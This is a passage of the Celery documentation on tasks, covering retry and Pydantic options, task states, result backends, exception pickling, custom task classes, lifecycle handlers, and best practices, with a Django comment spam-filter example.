between task autoretries. By default, this option is set to 600, which is 10 minutes.\n\nTask.retry_jitter\n\nA boolean. Jitter is used to introduce randomness into exponential backoff delays, to prevent all tasks in the queue from being executed simultaneously. If this option is set to True, the delay value calculated by retry_backoff is treated as a maximum, and the actual delay value will be a random number between zero and that maximum. By default, this option is set to True.\n\nAdded in version 5.3.0.\n\nTask.dont_autoretry_for\nA list/tuple of exception classes. These exceptions won’t be autoretried.\n\nThis allows to exclude some exceptions that match autoretry_for but for which you don’t want a retry.\n\nArgument validation with Pydantic\n\nAdded in version 5.5.0.\n\nYou can use Pydantic to validate and convert arguments as well as serializing results based on typehints by passing pydantic=True.\n\nNote\n\nArgument validation only covers arguments/return values on the task side. You still have serialize arguments yourself when invoking a task with delay() or apply_async().\n\nFor example:\n\nfrom pydantic import BaseModel\n\nclass ArgModel(BaseModel):\n    value: int\n\nclass ReturnModel(BaseModel):\n    value: str\n\n@app.task(pydantic=True)\ndef x(arg: ArgModel) -> ReturnModel:\n    # args/kwargs type hinted as Pydantic model will be converted\n    assert isinstance(arg, ArgModel)\n\n    # The returned model will be converted to a dict automatically\n    return ReturnModel(value=f\"example: {arg.value}\")\n\n\nThe task can then be called using a dict matching the model, and you’ll receive the returned model “dumped” (serialized using BaseModel.model_dump()):\n\n>>> result = x.delay({'value': 1})\n>>> result.get(timeout=1)\n{'value': 'example: 1'}\n\nUnion types, arguments to generics\n\nUnion types (e.g. Union[SomeModel, OtherModel]) or arguments to generics (e.g. list[SomeModel]) are not supported.\n\nIn case you want to support a list or similar types, it is recommended to use pydantic.RootModel.\n\nOptional parameters/return values\n\nOptional parameters or return values are also handled properly. For example, given this task:\n\nfrom typing import Optional\n\n# models are the same as above\n\n@app.task(pydantic=True)\ndef x(arg: Optional[ArgModel] = None) -> Optional[ReturnModel]:\n    if arg is None:\n        return None\n    return ReturnModel(value=f\"example: {arg.value}\")\n\n\nYou’ll get the following behavior:\n\n >>> result = x.delay()\n>>> result.get(timeout=1) is None\nTrue\n>>> result = x.delay({'value': 1})\n>>> result.get(timeout=1)\n{'value': 'example: 1'}\n\nReturn value handling\n\nReturn values will only be serialized if the returned model matches the annotation. If you pass a model instance of a different type, it will not be serialized. mypy should already catch such errors and you should fix your typehints then.\n\nPydantic parameters\n\nThere are a few more options influencing Pydantic behavior:\n\nTask.pydantic_strict\n\nBy default, strict mode is disabled. You can pass True to enable strict model validation.\n\nTask.pydantic_context\n\nPass additional validation context during Pydantic model validation. The context already includes the application object as celery_app and the task name as celery_task_name by default.\n\nTask.pydantic_dump_kwargs\n\nWhen serializing a result, pass these additional arguments to dump_kwargs(). By default, only mode='json' is passed.\n\nList of Options\n\nThe task decorator can take a number of options that change the way the task behaves, for example you can set the rate limit for a task using the rate_limit option.\n\nAny keyword argument passed to the task decorator will actually be set as an attribute of the resulting task class, and this is a list of the built-in attributes.\n\nGeneral\nTask.name\n\nThe name the task is registered as.\n\nYou can set this name manually, or a name will be automatically generated using the module and class name.\n\nSee also Names.\n\nTask.request\n\nIf the task is being executed this will contain information about the current request. Thread local storage is used.\n\nSee Task Request.\n\nTask.max_retries\n\nOnly applies if the task calls self.retry or if the task is decorated with the autoretry_for argument.\n\nThe maximum number of attempted retries before giving up. If the number of retries exceeds this value a MaxRetriesExceededError exception will be raised.\n\nNote\n\nYou have to call retry() manually, as it won’t automatically retry on exception..\n\nThe default is 3. A value of None will disable the retry limit and the task will retry forever until it succeeds.\n\nTask.throws\n\nOptional tuple of expected error classes that shouldn’t be regarded as an actual error.\n\nErrors in this list will be reported as a failure to the result backend, but the worker won’t log the event as an error, and no traceback will be included.\n\nExample:\n\n@task(throws=(KeyError, HttpNotFound)):\ndef get_foo():\n    something()\n\n\nError types:\n\nExpected errors (in Task.throws)\n\nLogged with severity INFO, traceback excluded.\n\nUnexpected errors\n\nLogged with severity ERROR, with traceback included.\n\nTask.default_retry_delay\n\nDefault time in seconds before a retry of the task should be executed. Can be either int or float. Default is a three minute delay.\n\nTask.rate_limit\n\nSet the rate limit for this task type (limits the number of tasks that can be run in a given time frame). Tasks will still complete when a rate limit is in effect, but it may take some time before it’s allowed to start.\n\nIf this is None no rate limit is in effect. If it is an integer or float, it is interpreted as “tasks per second”.\n\nThe rate limits can be specified in seconds, minutes or hours by appending “/s”, “/m” or “/h” to the value. Tasks will be evenly distributed over the specified time frame.\n\nExample: “100/m” (hundred tasks a minute). This will enforce a minimum delay of 600ms between starting two tasks on the same worker instance.\n\nDefault is the task_default_rate_limit setting: if not specified means rate limiting for tasks is disabled by default.\n\nNote that this is a per worker instance rate limit, and not a global rate limit. To enforce a global rate limit (e.g., for an API with a maximum number of requests per second), you must restrict to a given queue.\n\nTask.time_limit\n\nThe hard time limit, in seconds, for this task. When not set the workers default is used.\n\nTask.soft_time_limit\n\nThe soft time limit for this task. When not set the workers default is used.\n\nTask.ignore_result\n\nDon’t store task state. Note that this means you can’t use AsyncResult to check if the task is ready, or get its return value.\n\nNote: Certain features will not work if task results are disabled. For more details check the Canvas documentation.\n\nTask.store_errors_even_if_ignored\n\nIf True, errors will be stored even if the task is configured to ignore results.\n\nTask.serializer\n\nA string identifying the default serialization method to use. Defaults to the task_serializer setting. Can be pickle, json, yaml, or any custom serialization methods that have been registered with kombu.serialization.registry.\n\nPlease see Serializers for more information.\n\nTask.compression\n\nA string identifying the default compression scheme to use.\n\nDefaults to the task_compression setting. Can be gzip, or bzip2, or any custom compression schemes that have been registered with the kombu.compression registry.\n\nPlease see Compression for more information.\n\nTask.backend\n\nThe result store backend to use for this task. An instance of one of the backend classes in celery.backends. Defaults to app.backend, defined by the result_backend setting.\n\nTask.acks_late\n\nIf set to True messages for this task will be acknowledged after the task has been executed, not just before (the default behavior).\n\nNote: This means the task may be executed multiple times should the worker crash in the middle of execution. Make sure your tasks are idempotent.\n\nThe global default can be overridden by the task_acks_late setting.\n\nTask.track_started\n\nIf True the task will report its status as “started” when the task is executed by a worker. The default value is False as the normal behavior is to not report that level of granularity. Tasks are either pending, finished, or waiting to be retried. Having a “started” status can be useful for when there are long running tasks and there’s a need to report what task is currently running.\n\nThe host name and process id of the worker executing the task will be available in the state meta-data (e.g., result.info[‘pid’])\n\nThe global default can be overridden by the task_track_started setting.\n\nSee also\n\nThe API reference for Task.\n\nStates\n\nCelery can keep track of the tasks current state. The state also contains the result of a successful task, or the exception and traceback information of a failed task.\n\nThere are several result backends to choose from, and they all have different strengths and weaknesses (see Result Backends).\n\nDuring its lifetime a task will transition through several possible states, and each state may have arbitrary meta-data attached to it. When a task moves into a new state the previous state is forgotten about, but some transitions can be deduced, (e.g., a task now in the FAILED state, is implied to have been in the STARTED state at some point).\n\nThere are also sets of states, like the set of FAILURE_STATES, and the set of READY_STATES.\n\nThe client uses the membership of these sets to decide whether the exception should be re-raised (PROPAGATE_STATES), or whether the state can be cached (it can if the task is ready).\n\nYou can also define Custom states.\n\nResult Backends\n\nIf you want to keep track of tasks or need the return values, then Celery must store or send the states somewhere so that they can be retrieved later. There are several built-in result backends to choose from: SQLAlchemy/Django ORM, Memcached, RabbitMQ/QPid (rpc), and Redis – or you can define your own.\n\nNo backend works well for every use case. You should read about the strengths and weaknesses of each backend, and choose the most appropriate for your needs.\n\nWarning\n\nBackends use resources to store and transmit results. To ensure that resources are released, you must eventually call get() or forget() on EVERY AsyncResult instance returned after calling a task.\n\nSee also\n\nTask result backend settings\n\nRPC Result Backend (RabbitMQ/QPid)\n\nThe RPC result backend (rpc://) is special as it doesn’t actually store the states, but rather sends them as messages. This is an important difference as it means that a result can only be retrieved once, and only by the client that initiated the task. Two different processes can’t wait for the same result.\n\nEven with that limitation, it is an excellent choice if you need to receive state changes in real-time. Using messaging means the client doesn’t have to poll for new states.\n\nThe messages are transient (non-persistent) by default, so the results will disappear if the broker restarts. You can configure the result backend to send persistent messages using the result_persistent setting.\n\nDatabase Result Backend\n\nKeeping state in the database can be convenient for many, especially for web applications with a database already in place, but it also comes with limitations.\n\nPolling the database for new states is expensive, and so you should increase the polling intervals of operations, such as result.get().\n\nSome databases use a default transaction isolation level that isn’t suitable for polling tables for changes.\n\nIn MySQL the default transaction isolation level is REPEATABLE-READ: meaning the transaction won’t see changes made by other transactions until the current transaction is committed.\n\nChanging that to the READ-COMMITTED isolation level is recommended.\n\nBuilt-in States\nPENDING\n\nTask is waiting for execution or unknown. Any task id that’s not known is implied to be in the pending state.\n\nSTARTED\n\nTask has been started. Not reported by default, to enable please see app.Task.track_started.\n\nmeta-data:\n\npid and hostname of the worker process executing the task.\n\nSUCCESS\n\nTask has been successfully executed.\n\nmeta-data:\n\nresult contains the return value of the task.\n\npropagates:\n\nYes\n\nready:\n\nYes\n\nFAILURE\n\nTask execution resulted in failure.\n\nmeta-data:\n\nresult contains the exception occurred, and traceback contains the backtrace of the stack at the point when the exception was raised.\n\npropagates:\n\nYes\n\nRETRY\n\nTask is being retried.\n\nmeta-data:\n\nresult contains the exception that caused the retry, and traceback contains the backtrace of the stack at the point when the exceptions was raised.\n\npropagates:\n\nNo\n\nREVOKED\n\nTask has been revoked.\n\npropagates:\n\nYes\n\nCustom states\n\nYou can easily define your own states, all you need is a unique name. The name of the state is usually an uppercase string. As an example you could have a look at the abortable tasks which defines a custom ABORTED state.\n\nUse update_state() to update a task’s state:.\n\n@app.task(bind=True)\ndef upload_files(self, filenames):\n    for i, file in enumerate(filenames):\n        if not self.request.called_directly:\n            self.update_state(state='PROGRESS',\n                meta={'current': i, 'total': len(filenames)})\n\n\nHere I created the state “PROGRESS”, telling any application aware of this state that the task is currently in progress, and also where it is in the process by having current and total counts as part of the state meta-data. This can then be used to create progress bars for example.\n\nCreating pickleable exceptions\n\nA rarely known Python fact is that exceptions must conform to some simple rules to support being serialized by the pickle module.\n\nTasks that raise exceptions that aren’t pickleable won’t work properly when Pickle is used as the serializer.\n\nTo make sure that your exceptions are pickleable the exception MUST provide the original arguments it was instantiated with in its .args attribute. The simplest way to ensure this is to have the exception call Exception.__init__.\n\nLet’s look at some examples that work, and one that doesn’t:\n\n# OK:\nclass HttpError(Exception):\n    pass\n\n# BAD:\nclass HttpError(Exception):\n\n    def __init__(self, status_code):\n        self.status_code = status_code\n\n# OK:\nclass HttpError(Exception):\n\n    def __init__(self, status_code):\n        self.status_code = status_code\n        Exception.__init__(self, status_code)  # <-- REQUIRED\n\n\nSo the rule is: For any exception that supports custom arguments *args, Exception.__init__(self, *args) must be used.\n\nThere’s no special support for keyword arguments, so if you want to preserve keyword arguments when the exception is unpickled you have to pass them as regular args:\n\nclass HttpError(Exception):\n\n    def __init__(self, status_code, headers=None, body=None):\n        self.status_code = status_code\n        self.headers = headers\n        self.body = body\n\n        super(HttpError, self).__init__(status_code, headers, body)\n\nSemipredicates\n\nThe worker wraps the task in a tracing function that records the final state of the task. There are a number of exceptions that can be used to signal this function to change how it treats the return of the task.\n\nIgnore\n\nThe task may raise Ignore to force the worker to ignore the task. This means that no state will be recorded for the task, but the message is still acknowledged (removed from queue).\n\nThis can be used if you want to implement custom revoke-like functionality, or manually store the result of a task.\n\nExample keeping revoked tasks in a Redis set:\n\nfrom celery.exceptions import Ignore\n\n@app.task(bind=True)\ndef some_task(self):\n    if redis.ismember('tasks.revoked', self.request.id):\n        raise Ignore()\n\n\nExample that stores results manually:\n\nfrom celery import states\nfrom celery.exceptions import Ignore\n\n@app.task(bind=True)\ndef get_tweets(self, user):\n    timeline = twitter.get_timeline(user)\n    if not self.request.called_directly:\n        self.update_state(state=states.SUCCESS, meta=timeline)\n    raise Ignore()\n\nReject\n\nThe task may raise Reject to reject the task message using AMQPs basic_reject method. This won’t have any effect unless Task.acks_late is enabled.\n\nRejecting a message has the same effect as acking it, but some brokers may implement additional functionality that can be used. For example RabbitMQ supports the concept of Dead Letter Exchanges where a queue can be configured to use a dead letter exchange that rejected messages are redelivered to.\n\nReject can also be used to re-queue messages, but please be very careful when using this as it can easily result in an infinite message loop.\n\nExample using reject when a task causes an out of memory condition:\n\nimport errno\nfrom celery.exceptions import Reject\n\n@app.task(bind=True, acks_late=True)\ndef render_scene(self, path):\n    file = get_file(path)\n    try:\n        renderer.render_scene(file)\n\n    # if the file is too big to fit in memory\n    # we reject it so that it's redelivered to the dead letter exchange\n    # and we can manually inspect the situation.\n    except MemoryError as exc:\n        raise Reject(exc, requeue=False)\n    except OSError as exc:\n        if exc.errno == errno.ENOMEM:\n            raise Reject(exc, requeue=False)\n\n    # For any other error we retry after 10 seconds.\n    except Exception as exc:\n        raise self.retry(exc, countdown=10)\n\n\nExample re-queuing the message:\n\nfrom celery.exceptions import Reject\n\n@app.task(bind=True, acks_late=True)\ndef requeues(self):\n    if not self.request.delivery_info['redelivered']:\n        raise Reject('no reason', requeue=True)\n    print('received two times')\n\n\nConsult your broker documentation for more details about the basic_reject method.\n\nRetry\n\nThe Retry exception is raised by the Task.retry method to tell the worker that the task is being retried.\n\nCustom task classes\n\nAll tasks inherit from the app.Task class. The run() method becomes the task body.\n\nAs an example, the following code,\n\n@app.task\ndef add(x, y):\n    return x + y\n\n\nwill do roughly this behind the scenes:\n\nclass _AddTask(app.Task):\n\n    def run(self, x, y):\n        return x + y\nadd = app.tasks[_AddTask.name]\n\nInstantiation\n\nA task is not instantiated for every request, but is registered in the task registry as a global instance.\n\nThis means that the __init__ constructor will only be called once per process, and that the task class is semantically closer to an Actor.\n\nIf you have a task,\n\nfrom celery import Task\n\nclass NaiveAuthenticateServer(Task):\n\n    def __init__(self):\n        self.users = {'george': 'password'}\n\n    def run(self, username, password):\n        try:\n            return self.users[username] == password\n        except KeyError:\n            return False\n\n\nAnd you route every request to the same process, then it will keep state between requests.\n\nThis can also be useful to cache resources, For example, a base Task class that caches a database connection:\n\nfrom celery import Task\n\nclass DatabaseTask(Task):\n    _db = None\n\n    @property\n    def db(self):\n        if self._db is None:\n            self._db = Database.connect()\n        return self._db\n\nPer task usage\n\nThe above can be added to each task like this:\n\nfrom celery.app import task\n\n@app.task(base=DatabaseTask, bind=True)\ndef process_rows(self: task):\n    for row in self.db.table.all():\n        process_row(row)\n\n\nThe db attribute of the process_rows task will then always stay the same in each process.\n\nApp-wide usage\n\nYou can also use your custom class in your whole Celery app by passing it as the task_cls argument when instantiating the app. This argument should be either a string giving the python path to your Task class or the class itself:\n\nfrom celery import Celery\n\napp = Celery('tasks', task_cls='your.module.path:DatabaseTask')\n\n\nThis will make all your tasks declared using the decorator syntax within your app to use your DatabaseTask class and will all have a db attribute.\n\nThe default value is the class provided by Celery: 'celery.app.task:Task'.\n\nHandlers\n\nTask handlers are methods that execute at specific points in a task’s lifecycle. All handlers run synchronously within the same worker process and thread that executes the task.\n\nExecution timeline\n\nThe following diagram shows the exact order of execution:\n\nWorker Process Timeline\n┌───────────────────────────────────────────────────────────────┐\n│  1. before_start()      ← Blocks until complete               │\n│  2. run()               ← Your task function                  │\n│  3. [Result Backend]    ← State + return value persisted      │\n│  4. on_success() OR     ← Outcome-specific handler            │\n│     on_retry() OR       │                                     │\n│     on_failure()        │                                     │\n│  5. after_return()      ← Always runs last                    │\n└───────────────────────────────────────────────────────────────┘\n\n\nImportant\n\nKey points:\n\nAll handlers run in the same worker process as your task\n\nbefore_start blocks the task - run() won’t start until it completes\n\nResult backend is updated before on_success/on_failure - other clients can see the task as finished while handlers are still running\n\nafter_return always executes, regardless of task outcome\n\nAvailable handlers\nbefore_start(self, task_id, args, kwargs)\n\nRun by the worker before the task starts executing.\n\nNote\n\nThis handler blocks the task: the run() method will not begin until before_start returns.\n\nAdded in version 5.2.\n\nParameters:\n\ntask_id – Unique id of the task to execute.\n\nargs – Original arguments for the task to execute.\n\nkwargs – Original keyword arguments for the task to execute.\n\nThe return value of this handler is ignored.\n\non_success(self, retval, task_id, args, kwargs)\n\nSuccess handler.\n\nRun by the worker if the task executes successfully.\n\nNote\n\nInvoked after the task result has already been persisted in the result backend. External clients may observe the task as SUCCESS while this handler is still running.\n\nParameters:\n\nretval – The return value of the task.\n\ntask_id – Unique id of the executed task.\n\nargs – Original arguments for the executed task.\n\nkwargs – Original keyword arguments for the executed task.\n\nThe return value of this handler is ignored.\n\non_retry(self, exc, task_id, args, kwargs, einfo)\n\nRetry handler.\n\nRun by the worker when the task is to be retried.\n\nNote\n\nInvoked after the task state has been updated to RETRY in the result backend but before the retry is scheduled.\n\nParameters:\n\nexc – The exception sent to retry().\n\ntask_id – Unique id of the retried task.\n\nargs – Original arguments for the retried task.\n\nkwargs – Original keyword arguments for the retried task.\n\neinfo – ExceptionInfo instance.\n\nThe return value of this handler is ignored.\n\non_failure(self, exc, task_id, args, kwargs, einfo)\n\nFailure handler.\n\nRun by the worker when the task fails.\n\nNote\n\nInvoked after the task result has already been persisted in the result backend with FAILURE state. External clients may observe the task as failed while this handler is still running.\n\nParameters:\n\nexc – The exception raised by the task.\n\ntask_id – Unique id of the failed task.\n\nargs – Original arguments for the failed task.\n\nkwargs – Original keyword arguments for the failed task.\n\neinfo – ExceptionInfo instance.\n\nThe return value of this handler is ignored.\n\nafter_return(self, status, retval, task_id, args, kwargs, einfo)\n\nHandler called after the task returns.\n\nNote\n\nExecutes after on_success/on_retry/on_failure. This is the final hook in the task lifecycle and always runs, regardless of outcome.\n\nParameters:\n\nstatus – Current task state.\n\nretval – Task return value/exception.\n\ntask_id – Unique id of the task.\n\nargs – Original arguments for the task that returned.\n\nkwargs – Original keyword arguments for the task that returned.\n\neinfo – ExceptionInfo instance.\n\nThe return value of this handler is ignored.\n\nExample usage\nimport time\nfrom celery import Task\n\nclass MyTask(Task):\n\n    def before_start(self, task_id, args, kwargs):\n        print(f\"Task {task_id} starting with args {args}\")\n        # This blocks - run() won't start until this returns\n\n    def on_success(self, retval, task_id, args, kwargs):\n        print(f\"Task {task_id} succeeded with result: {retval}\")\n        # Result is already visible to clients at this point\n\n    def on_failure(self, exc, task_id, args, kwargs, einfo):\n        print(f\"Task {task_id} failed: {exc}\")\n        # Task state is already FAILURE in backend\n\n    def after_return(self, status, retval, task_id, args, kwargs, einfo):\n        print(f\"Task {task_id} finished with status: {status}\")\n        # Always runs last\n\n@app.task(base=MyTask)\ndef my_task(x, y):\n    return x + y\n\nRequests and custom requests\n\nUpon receiving a message to run a task, the worker creates a request to represent such demand.\n\nCustom task classes may override which request class to use by changing the attribute celery.app.task.Task.Request. You may either assign the custom request class itself, or its fully qualified name.\n\nThe request has several responsibilities. Custom request classes should cover them all – they are responsible to actually run and trace the task. We strongly recommend to inherit from celery.worker.request.Request.\n\nWhen using the pre-forking worker, the methods on_timeout() and on_failure() are executed in the main worker process. An application may leverage such facility to detect failures which are not detected using celery.app.task.Task.on_failure().\n\nAs an example, the following custom request detects and logs hard time limits, and other failures.\n\nimport logging\nfrom celery import Task\nfrom celery.worker.request import Request\n\nlogger = logging.getLogger('my.package')\n\nclass MyRequest(Request):\n    'A minimal custom request to log failures and hard time limits.'\n\n    def on_timeout(self, soft, timeout):\n        super(MyRequest, self).on_timeout(soft, timeout)\n        if not soft:\n           logger.warning(\n               'A hard timeout was enforced for task %s',\n               self.task.name\n           )\n\n    def on_failure(self, exc_info, send_failed_event=True, return_ok=False):\n        super().on_failure(\n            exc_info,\n            send_failed_event=send_failed_event,\n            return_ok=return_ok\n        )\n        logger.warning(\n            'Failure detected for task %s',\n            self.task.name\n        )\n\nclass MyTask(Task):\n    Request = MyRequest  # you can use a FQN 'my.package:MyRequest'\n\n@app.task(base=MyTask)\ndef some_longrunning_task():\n    # use your imagination\n\nHow it works\n\nHere come the technical details. This part isn’t something you need to know, but you may be interested.\n\nAll defined tasks are listed in a registry. The registry contains a list of task names and their task classes. You can investigate this registry yourself:\n\n>>> from proj.celery import app\n>>> app.tasks\n{'celery.chord_unlock':\n    <@task: celery.chord_unlock>,\n 'celery.backend_cleanup':\n    <@task: celery.backend_cleanup>,\n 'celery.chord':\n    <@task: celery.chord>}\n\n\nThis is the list of tasks built into Celery. Note that tasks will only be registered when the module they’re defined in is imported.\n\nThe default loader imports any modules listed in the imports setting.\n\nThe app.task() decorator is responsible for registering your task in the applications task registry.\n\nWhen tasks are sent, no actual function code is sent with it, just the name of the task to execute. When the worker then receives the message it can look up the name in its task registry to find the execution code.\n\nThis means that your workers should always be updated with the same software as the client. This is a drawback, but the alternative is a technical challenge that’s yet to be solved.\n\nTips and Best Practices\nIgnore results you don’t want\n\nIf you don’t care about the results of a task, be sure to set the ignore_result option, as storing results wastes time and resources.\n\n@app.task(ignore_result=True)\ndef mytask():\n    something()\n\n\nResults can even be disabled globally using the task_ignore_result setting.\n\nResults can be enabled/disabled on a per-execution basis, by passing the ignore_result boolean parameter, when calling apply_async.\n\n@app.task\ndef mytask(x, y):\n    return x + y\n\n# No result will be stored\nresult = mytask.apply_async((1, 2), ignore_result=True)\nprint(result.get()) # -> None\n\n# Result will be stored\nresult = mytask.apply_async((1, 2), ignore_result=False)\nprint(result.get()) # -> 3\n\n\nBy default tasks will not ignore results (ignore_result=False) when a result backend is configured.\n\nThe option precedence order is the following:\n\nGlobal task_ignore_result\n\nignore_result option\n\nTask execution option ignore_result\n\nMore optimization tips\n\nYou find additional optimization tips in the Optimizing Guide.\n\nAvoid launching synchronous subtasks\n\nHaving a task wait for the result of another task is really inefficient, and may even cause a deadlock if the worker pool is exhausted.\n\nMake your design asynchronous instead, for example by using callbacks.\n\nBad:\n\n@app.task\ndef update_page_info(url):\n    page = fetch_page.delay(url).get()\n    info = parse_page.delay(page).get()\n    store_page_info.delay(url, info)\n\n@app.task\ndef fetch_page(url):\n    return myhttplib.get(url)\n\n@app.task\ndef parse_page(page):\n    return myparser.parse_document(page)\n\n@app.task\ndef store_page_info(url, info):\n    return PageInfo.objects.create(url, info)\n\n\nGood:\n\ndef update_page_info(url):\n    # fetch_page -> parse_page -> store_page\n    chain = fetch_page.s(url) | parse_page.s() | store_page_info.s(url)\n    chain()\n\n@app.task()\ndef fetch_page(url):\n    return myhttplib.get(url)\n\n@app.task()\ndef parse_page(page):\n    return myparser.parse_document(page)\n\n@app.task(ignore_result=True)\ndef store_page_info(info, url):\n    PageInfo.objects.create(url=url, info=info)\n\n\nHere I instead created a chain of tasks by linking together different signature()’s. You can read about chains and other powerful constructs at Canvas: Designing Work-flows.\n\nBy default Celery will not allow you to run subtasks synchronously within a task, but in rare or extreme cases you might need to do so. WARNING: enabling subtasks to run synchronously is not recommended!\n\n@app.task\ndef update_page_info(url):\n    page = fetch_page.delay(url).get(disable_sync_subtasks=False)\n    info = parse_page.delay(page).get(disable_sync_subtasks=False)\n    store_page_info.delay(url, info)\n\n@app.task\ndef fetch_page(url):\n    return myhttplib.get(url)\n\n@app.task\ndef parse_page(page):\n    return myparser.parse_document(page)\n\n@app.task\ndef store_page_info(url, info):\n    return PageInfo.objects.create(url, info)\n\nPerformance and Strategies\nGranularity\n\nThe task granularity is the amount of computation needed by each subtask. In general it is better to split the problem up into many small tasks rather than have a few long running tasks.\n\nWith smaller tasks you can process more tasks in parallel and the tasks won’t run long enough to block the worker from processing other waiting tasks.\n\nHowever, executing a task does have overhead. A message needs to be sent, data may not be local, etc. So if the tasks are too fine-grained the overhead added probably removes any benefit.\n\nSee also\n\nThe book Art of Concurrency has a section dedicated to the topic of task granularity [AOC1].\n\n[AOC1]\n\nBreshears, Clay. Section 2.2.1, “The Art of Concurrency”. O’Reilly Media, Inc. May 15, 2009. ISBN-13 978-0-596-52153-0.\n\nData locality\n\nThe worker processing the task should be as close to the data as possible. The best would be to have a copy in memory, the worst would be a full transfer from another continent.\n\nIf the data is far away, you could try to run another worker at location, or if that’s not possible - cache often used data, or preload data you know is going to be used.\n\nThe easiest way to share data between workers is to use a distributed cache system, like memcached.\n\nSee also\n\nThe paper Distributed Computing Economics by Jim Gray is an excellent introduction to the topic of data locality.\n\nState\n\nSince Celery is a distributed system, you can’t know which process, or on what machine the task will be executed. You can’t even know if the task will run in a timely manner.\n\nThe ancient async sayings tells us that “asserting the world is the responsibility of the task”. What this means is that the world view may have changed since the task was requested, so the task is responsible for making sure the world is how it should be; If you have a task that re-indexes a search engine, and the search engine should only be re-indexed at maximum every 5 minutes, then it must be the tasks responsibility to assert that, not the callers.\n\nAnother gotcha is Django model objects. They shouldn’t be passed on as arguments to tasks. It’s almost always better to re-fetch the object from the database when the task is running instead, as using old data may lead to race conditions.\n\nImagine the following scenario where you have an article and a task that automatically expands some abbreviations in it:\n\nclass Article(models.Model):\n    title = models.CharField()\n    body = models.TextField()\n\n@app.task\ndef expand_abbreviations(article):\n    article.body.replace('MyCorp', 'My Corporation')\n    article.save()\n\n\nFirst, an author creates an article and saves it, then the author clicks on a button that initiates the abbreviation task:\n\n>>> article = Article.objects.get(id=102)\n>>> expand_abbreviations.delay(article)\n\n\nNow, the queue is very busy, so the task won’t be run for another 2 minutes. In the meantime another author makes changes to the article, so when the task is finally run, the body of the article is reverted to the old version because the task had the old body in its argument.\n\nFixing the race condition is easy, just use the article id instead, and re-fetch the article in the task body:\n\n@app.task\ndef expand_abbreviations(article_id):\n    article = Article.objects.get(id=article_id)\n    article.body.replace('MyCorp', 'My Corporation')\n    article.save()\n\n>>> expand_abbreviations.delay(article_id)\n\n\nThere might even be performance benefits to this approach, as sending large messages may be expensive.\n\nDatabase transactions\n\nLet’s have a look at another example:\n\nfrom django.db import transaction\nfrom django.http import HttpResponseRedirect\n\n@transaction.atomic\ndef create_article(request):\n    article = Article.objects.create()\n    expand_abbreviations.delay(article.pk)\n    return HttpResponseRedirect('/articles/')\n\n\nThis is a Django view creating an article object in the database, then passing the primary key to a task. It uses the transaction.atomic decorator, that will commit the transaction when the view returns, or roll back if the view raises an exception.\n\nThere is a race condition because transactions are atomic. This means the article object is not persisted to the database until after the view function returns a response. If the asynchronous task starts executing before the transaction is committed, it may attempt to query the article object before it exists. To prevent this, we need to ensure that the transaction is committed before triggering the task.\n\nThe solution is to use delay_on_commit() instead:\n\nfrom django.db import transaction\nfrom django.http import HttpResponseRedirect\n\n@transaction.atomic\ndef create_article(request):\n    article = Article.objects.create()\n    expand_abbreviations.delay_on_commit(article.pk)\n    return HttpResponseRedirect('/articles/')\n\n\nThis method was added in Celery 5.4. It’s a shortcut that uses Django’s on_commit callback to launch your Celery task once all transactions have been committed successfully.\n\nWith Celery <5.4\n\nIf you’re using an older version of Celery, you can replicate this behaviour using the Django callback directly as follows:\n\nimport functools\nfrom django.db import transaction\nfrom django.http import HttpResponseRedirect\n\n@transaction.atomic\ndef create_article(request):\n    article = Article.objects.create()\n    transaction.on_commit(\n        functools.partial(expand_abbreviations.delay, article.pk)\n    )\n    return HttpResponseRedirect('/articles/')\n\n\nNote\n\non_commit is available in Django 1.9 and above, if you are using a version prior to that then the django-transaction-hooks library adds support for this.\n\nExample\n\nLet’s take a real world example: a blog where comments posted need to be filtered for spam. When the comment is created, the spam filter runs in the background, so the user doesn’t have to wait for it to finish.\n\nI have a Django blog application allowing comments on blog posts. I’ll describe parts of the models/views and tasks for this application.\n\nblog/models.py\n\nThe comment model looks like this:\n\nfrom django.db import models\nfrom django.utils.translation import ugettext_lazy as _\n\n\nclass Comment(models.Model):\n    name = models.CharField(_('name'), max_length=64)\n    email_address = models.EmailField(_('email address'))\n    homepage = models.URLField(_('home page'),\n                               blank=True, verify_exists=False)\n    comment = models.TextField(_('comment'))\n    pub_date = models.DateTimeField(_('Published date'),\n                                    editable=False, auto_add_now=True)\n    is_spam = models.BooleanField(_('spam?'),\n                                  default=False, editable=False)\n\n    class Meta:\n        verbose_name = _('comment')\n        verbose_name_plural = _('comments')\n\n\nIn the view where the comment is posted, I first write the comment to the database, then I launch the spam filter task in the background.\n\nblog/views.py\nfrom django import forms\nfrom django.http import HttpResponseRedirect\nfrom django.template.context import RequestContext\nfrom django.shortcuts import get_object_or_404, render_to_response\n\nfrom blog import tasks\nfrom blog.models import Comment\n\n\nclass CommentForm(forms.ModelForm):\n\n    class Meta:\n        model = Comment\n\n\ndef add_comment(request, slug, template_name='comments/create.html'):\n    post = get_object_or_404(Entry, slug=slug)\n    remote_addr = request.META.get('REMOTE_ADDR')\n\n    if request.method == 'post':\n        form = CommentForm(request.POST, request.FILES)\n        if form.is_valid():\n            comment = form.save()\n            # Check spam asynchronously.\n            tasks.spam_filter.delay(comment_id=comment.id,\n                                    remote_addr=remote_addr)\n            return HttpResponseRedirect(post.get_absolute_url())\n    else:\n        form = CommentForm()\n\n    context = RequestContext(request, {'form': form})\n    return render_to_response(template_name, context_instance=context)\n\n\nTo filter spam in comments I use Akismet, the service used to filter spam in comments posted to the free blog platform Wordpress. Akismet is free for personal use, but for commercial use you need to pay. You have to sign up to their service to get an API key.\n\nTo make API calls to Akismet I use the akismet.py library written by Michael Foord.\n\nblog/tasks.py\nfrom celery import Celery\n\nfrom akismet import Akismet\n\nfrom django.core.exceptions import ImproperlyConfigured\nfrom django.contrib.sites.models import Site\n\nfrom blog.models import Comment\n\n\napp = Celery(broker='amqp://')\n\n\n@app.task\ndef spam_filter(comment_id, remote_addr=None):\n    logger = spam_filter.get_logger()\n    logger.info('Running spam filter for comment %s', comment_id)\n\n    comment = Comment.objects.get(pk=comment_id)\n    current_domain = Site.objects.get_current().domain\n    akismet = Akismet(settings.AKISMET_KEY, 'http://{0}'.format(domain))\n    if not akismet.verify_key():\n        raise ImproperlyConfigured('Invalid AKISMET_KEY')\n\n\n    is_spam = akismet.comment_check(user_ip=remote_addr,\n                        comment_content=comment.comment,\n                        comment_author=comment.name,\n                        comment_author_email=comment.email_address)\n    if is_spam:\n        comment.is_spam = True\n        comment.save()\n\n    return is_spam\n\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nApplication\n\nNext topic\n\nCalling Tasks\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext 